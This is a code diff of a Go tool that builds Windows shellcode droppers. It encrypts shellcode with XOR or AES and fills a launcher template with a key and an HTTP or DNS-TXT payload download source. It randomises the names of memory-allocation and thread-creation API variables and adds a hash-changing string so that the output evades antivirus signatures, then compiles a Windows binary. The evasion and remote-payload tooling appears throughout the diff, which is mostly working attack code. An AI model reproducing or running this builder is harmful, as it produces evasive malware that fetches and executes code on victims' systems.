@@ -1,23 +1,21 @@
 package main
 
 import (
-	"flag"
-	"os"
-	"math/rand"
-	"io/ioutil"
-	"encoding/base64"
-	"strings"
+	"bytes"
 	"crypto/aes"
 	"crypto/cipher"
-	"fmt"
-	"strconv"
+	"encoding/base64"
+	"flag"
+	"io/ioutil"
+	"math/rand"
+	"os"
 	"os/exec"
-	"bytes"
+	"strings"
 
 	log "github.com/sirupsen/logrus"
 )
 
-const letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
+const ALPHABET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
 
 func BuildPayload() {
 	log.Info("Building payload for windows target")
@@ -33,7 +31,7 @@ func BuildPayload() {
 
 	cmd.Env = os.Environ()
 	cmd.Env = append(cmd.Env, "GOOS=windows")
-	cmd.Env = append(cmd.Env, "")
+	cmd.Env = append(cmd.Env, "GOARCH=amd64")
 
 	var out bytes.Buffer
 	var stderr bytes.Buffer
@@ -63,7 +61,7 @@ func RandStringBytes(n int) string {
 	b := make([]byte, n)
 
 	for i := range b {
-		b[i] = letterBytes[rand.Intn(len(letterBytes))]
+		b[i] = ALPHABET[rand.Intn(len(ALPHABET))]
 	}
 
 	return string(b)
@@ -75,7 +73,6 @@ func AESKeyPadding(byte_array []byte) []byte {
 	} else {
 		if len(byte_array) < 32 {
 			bytes_to_add := 32 - len(byte_array)
-
 
 			for i := 0; i < bytes_to_add; i++ {
 				byte_array = append(byte_array, byte('A'))
@@ -135,7 +132,7 @@ func EncryptXOR(shellcode_file string, key string) string {
 	ciphertext := make([]byte, len(plaintext))
 
 	for i := 0; i < len(plaintext); i++ {
-		ciphertext[i] = plaintext[i] ^ key_byte[i % len(key_byte)]
+		ciphertext[i] = plaintext[i] ^ key_byte[i%len(key_byte)]
 	}
 
 	ciphertext_b64 := base64.StdEncoding.EncodeToString([]byte(ciphertext))
@@ -145,35 +142,63 @@ func EncryptXOR(shellcode_file string, key string) string {
 	return ciphertext_b64
 }
 
-func CopyFile(src, dst string) (err error) {
-	sfi, err := os.Stat(src)
+func CopyFile(src, dest string) {
+	input, err := ioutil.ReadFile(src)
 	if err != nil {
-		log.Error(err)
-		return
+		log.Fatalln(err)
 	}
 
-	dfi, err := os.Stat(dst)
+	err = ioutil.WriteFile(dest, input, 0644)
 	if err != nil {
-		if !os.IsNotExist(err) {
-			return
+		log.Fatalln(err)
+	}
+}
+
+func ReplaceStringInFile(file_path, string_to_replace, string_to_put string) {
+	input, err := ioutil.ReadFile(file_path)
+	if err != nil {
+		log.Fatalln(err)
+	}
+
+	lines := strings.Split(string(input), "\n")
+
+	for i, line := range lines {
+		if strings.Contains(line, string_to_replace) {
+			lines[i] = strings.Replace(lines[i], string_to_replace, string_to_put, -1)
 		}
+	}
+	output := strings.Join(lines, "\n")
+	err = ioutil.WriteFile(file_path, []byte(output), 0644)
+	if err != nil {
+		log.Fatalln(err)
+	}
+}
+
+func PopulateTemplate(src_file_path, crypter_mode, download_mode, download_src, execution_mode, key, randomizer string, debug bool) {
+	log.Info("Performing template variable insertion")
+
+	if debug {
+		ReplaceStringInFile(src_file_path, "{{DEBUG}}", "true")
 	} else {
-		if !(dfi.Mode().IsRegular()) {
-			return fmt.Errorf("CopyFile: non-regular destination file %s (%q)", dfi.Name(), dfi.Mode().String())
-		}
-
-		if os.SameFile(sfi, dfi) {
-			return
-		}
+		ReplaceStringInFile(src_file_path, "{{DEBUG}}", "false")
 	}
 
-	if err = os.Link(src, dst); err == nil {
-		return
+	ReplaceStringInFile(src_file_path, "{{CRYPTER_MODE}}", crypter_mode)
+	ReplaceStringInFile(src_file_path, "{{DOWNLOAD_MODE}}", download_mode)
+	ReplaceStringInFile(src_file_path, "{{EXECUTION_MODE}}", execution_mode)
+	ReplaceStringInFile(src_file_path, "{{KEY}}", key)
+	ReplaceStringInFile(src_file_path, "{{RANDOMIZER}}", randomizer)
+	ReplaceStringInFile(src_file_path, "{{DOWNLOAD_SRC}}", download_src)
+}
+
+func RandomizeVariables(variable_templatized_names []string) {
+	log.Info("Randomizing select variable names")
+
+	for i := 0; i < len(variable_templatized_names); i++ {
+		new_var_name := RandStringBytes(12)
+
+		ReplaceStringInFile("./tmp.go", variable_templatized_names[i], new_var_name)
 	}
-
-	err = CopyFile(src, dst)
-
-	return
 }
 
 func main() {
@@ -182,7 +207,6 @@ func main() {
 	var execution_mode string
 	var shellcode_file string
 	var download_src string
-	var randomization bool
 	var debug bool
 
 	flag.StringVar(&crypter_mode, "crypter_mode", "xor", "The encryption mode to use for the shellcode (xor, aes, none). Default: xor")
@@ -190,7 +214,6 @@ func main() {
 	flag.StringVar(&download_src, "download_src", "", "The URL that will point to the payload (for http) or the domain name with the TXT record containing the payload (for dns).")
 	flag.StringVar(&execution_mode, "execution_mode", "1", "The method to use for execution of the shellcode. This is a numerical value. See README for detailed explanation of modes.")
 	flag.StringVar(&shellcode_file, "shellcode_file", "", "The path and filename for the file containing the binary shellcode to be executed by the launcher")
-	flag.BoolVar(&randomization, "randomization", true, "Whether to randomize elements within the launcher (true/false).")
 	flag.BoolVar(&debug, "debug", true, "Place the payload in debug mode (true/false).")
 
 	flag.Parse()
@@ -198,6 +221,7 @@ func main() {
 	crypter_mode = strings.ToLower(crypter_mode)
 	download_mode = strings.ToLower(download_mode)
 	execution_mode = strings.ToLower(execution_mode)
+	download_src = strings.ToLower(download_src)
 
 	log.SetFormatter(&log.JSONFormatter{})
 	log.SetLevel(log.InfoLevel)
@@ -205,6 +229,7 @@ func main() {
 	var crypter_modes = []string{"aes", "xor", "none"}
 	var download_modes = []string{"http", "dns", "none"}
 	var execution_modes = []string{"1"}
+	var templatized_variables_to_randomize = []string{"{{MEM_COMMIT}}", "{{MEM_RESERVE}}", "{{PAGE_EXECUTE_READ}}", "{{PAGE_READWRITE}}", "{{KERNEL_32}}", "{{NTDLL}}", "{{VIRTUAL_ALLOC}}", "{{VIRTUAL_PROTECT}}", "{{RTL_COPY_MEMORY}}", "{{CREATE_THREAD}}", "{{WAIT_FOR_SINGLE_OBJECT}}", "{{TMP_ADDRESS}}", "{{TMP_PROTECT}}", "{{THREAD}}"}
 	var key string
 	var ciphertext_b64 string
 
@@ -274,46 +299,33 @@ func main() {
 	// create randomization string, insert into template
 	randomizer := RandStringBytes(12)
 
-	template_file := "./templates/1.template"
+	template_file := "./templates/template.go"
 	tmp_go_file := "./tmp.go"
 
-	content, _ := ioutil.ReadFile(template_file)
+	CopyFile(template_file, tmp_go_file)
 
-	new_content := strings.ReplaceAll(string(content), "{{RANDOMIZER}}", "\"" + randomizer + "\"")
-	new_content = strings.ReplaceAll(new_content, "{{CRYPTER_MODE}}", "\"" + crypter_mode + "\"")
-	new_content = strings.ReplaceAll(new_content, "{{DOWNLOAD_MODE}}", "\"" + download_mode + "\"")
-	new_content = strings.ReplaceAll(new_content, "{{EXECUTION_MODE}}", "\"" + execution_mode + "\"")
-	new_content = strings.ReplaceAll(new_content, "{{DOWNLOAD_SRC}}", "\"" + download_src + "\"")
-	new_content = strings.ReplaceAll(new_content, "{{DEBUG}}", strconv.FormatBool(debug))
-	new_content = strings.ReplaceAll(new_content, "{{KEY}}", "\"" + key + "\"")
+	PopulateTemplate(tmp_go_file, crypter_mode, download_mode, download_src, execution_mode, key, randomizer, debug)
 
-	f, err = os.Create(tmp_go_file)
-	if err != nil {
-		log.Fatal(err)
-	}
+	// randomize variables
+	RandomizeVariables(templatized_variables_to_randomize)
 
-	defer f.Close()
-
-	_, err = f.WriteString(new_content)
-	if err != nil {
-		log.Fatal(err)
-	}
-
-	log.Info("Wrote tmp file")
-
-	content = string(ioutil.ReadFile(tmp_go_file))
-
-	var variable_names = [string]{"MEM_COMMIT", "MEM_RESERVE", "PAGE_EXECUTE_READ", "PAGE_READWRITE"}
-	for i := range(variable_names) {
-		new_var_name := RandStringBytes(10)
-		new_content = strings.ReplaceAll(variable_names[i], new_var_name)
-	}
-
-	// if randomization, randomize variable names in template
 	// generate binary
 	BuildPayload()
 
-	// delete tmp file
+	log.Info("Payload/dropper generation complete")
 
-	// print relevant information to the console
+	if debug == true {
+		log.Info("Crypter mode: " + crypter_mode)
+		log.Info("Download mode: " + download_mode)
+		log.Info("Execution mode: " + execution_mode)
+		log.Info("Download source: " + download_src)
+		log.Info("Shellcode file: " + shellcode_file)
+		log.Info("Key: " + key)
+		log.Info("Template file: " + template_file)
+		log.Info("Final dropper Go file (not deleted due to debug mode): " + tmp_go_file)
+		log.Info("Randomization (hash adjustment) string: " + randomizer)
+	} else {
+		// delete tmp file
+		os.Remove(tmp_go_file)
+	}
 }
